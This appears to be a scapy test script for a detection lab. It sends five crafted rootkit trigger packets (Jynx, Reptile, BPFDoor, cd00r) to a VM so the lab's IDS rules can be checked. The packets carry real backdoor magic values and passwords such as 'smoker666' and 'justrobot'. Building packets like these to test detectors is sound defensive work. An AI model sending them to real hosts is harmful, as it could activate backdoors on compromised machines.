#!/usr/bin/env python3
"""
==========================================================================
  SENTINEL FORGE - KALI LINUX ATTACK SIMULATOR
  
  Run this script FROM KALI LINUX to send crafted rootkit magic packets
  to the Ubuntu VM running Occult Tracer. Each packet is designed to
  match a specific rule in combined_rules_v2.json.
  
  Usage:
      sudo python3 kali_attack.py <UBUNTU_IP>
  
  Example:
      sudo python3 kali_attack.py 192.168.1.10
==========================================================================
"""

import sys
import time
from scapy.all import IP, TCP, UDP, ICMP, Raw, send

if len(sys.argv) < 2:
    print("Usage: sudo python3 kali_attack.py <UBUNTU_IP>")
    print("Example: sudo python3 kali_attack.py 192.168.1.10")
    sys.exit(1)

TARGET = sys.argv[1]
print(f"\n{'='*60}")
print(f"  SENTINEL FORGE ATTACK SIMULATOR")
print(f"  Target: {TARGET}")
print(f"{'='*60}\n")
print("[*] Sending 5 crafted rootkit magic packets...\n")
time.sleep(1)

# ---------------------------------------------------------------
# ATTACK 1: Jynx Rootkit (rule_5e18defbaacc, score=30)
# Matches: MAGIC_ACK=0xdead, MAGIC_SEQ=0xbeef
# ---------------------------------------------------------------
print("[1/5] Sending Jynx Rootkit magic packet (ACK=0xDEAD, SEQ=0xBEEF)...")
pkt1 = IP(dst=TARGET) / TCP(
    sport=12345,
    dport=80,
    seq=0xBEEF,
    ack=0xDEAD,
    flags="A"
)
send(pkt1, verbose=0)
print("      -> Sent!\n")
time.sleep(1)

# ---------------------------------------------------------------
# ATTACK 2: Reptile Rootkit (rule_82a5809354c5, score=100)
# Matches: sport=666, payload contains "smoke" magic + "smoker666" password
# ---------------------------------------------------------------
print("[2/5] Sending Reptile Rootkit magic packet (sport=666, magic='smoke')...")
pkt2 = IP(dst=TARGET) / TCP(
    sport=666,
    dport=443,
    flags="S"
) / Raw(load=b"smoke" + b"\x00" * 4 + b"smoker666")
send(pkt2, verbose=0)
print("      -> Sent!\n")
time.sleep(1)

# ---------------------------------------------------------------
# ATTACK 3: BPFDoor Rootkit (rule_2e4a4f2ff6e2, score=30)
# Matches: UDP with payload magic bytes 0x7255
# ---------------------------------------------------------------
print("[3/5] Sending BPFDoor UDP magic packet (magic=0x7255)...")
pkt3 = IP(dst=TARGET) / UDP(
    sport=9999,
    dport=53
) / Raw(load=b"\x72\x55" + b"\x00" * 16)
send(pkt3, verbose=0)
print("      -> Sent!\n")
time.sleep(1)

# ---------------------------------------------------------------
# ATTACK 4: cd00r Variant (rule_170482bb36a3, score=65)
# Matches: TCP payload starts with "Z4vE", IP at offset 4, port at offset 8
# ---------------------------------------------------------------
print("[4/5] Sending cd00r variant payload (starts with 'Z4vE')...")
pkt4 = IP(dst=TARGET) / TCP(
    sport=4444,
    dport=443,
    flags="PA"
) / Raw(load=b"Z4vE" + b"\xc0\xa8\x01\x14" + b"\x11\x5c" + b"\x00" * 20)
send(pkt4, verbose=0)
print("      -> Sent!\n")
time.sleep(1)

# ---------------------------------------------------------------
# ATTACK 5: BPFDoor TCP Variant (rule_5a99743bce61, score=60)
# Matches: TCP payload magic 0x5293 + password "justrobot"
# ---------------------------------------------------------------
print("[5/5] Sending BPFDoor TCP magic packet (magic=0x5293, password='justrobot')...")
pkt5 = IP(dst=TARGET) / TCP(
    sport=31337,
    dport=8080,
    flags="PA"
) / Raw(load=b"\x52\x93" + b"justrobot" + b"\x00" * 10)
send(pkt5, verbose=0)
print("      -> Sent!\n")

# ---------------------------------------------------------------
# SUMMARY
# ---------------------------------------------------------------
print(f"{'='*60}")
print(f"  ALL 5 ATTACK PACKETS SENT!")
print(f"  ")
print(f"  Check the Ubuntu VM terminals:")
print(f"    Terminal 2 (dynamic_analyzer.py) should show ALERTS")
print(f"    Terminal 1 (agent_core.py) should show BLOCK actions")
print(f"{'='*60}")
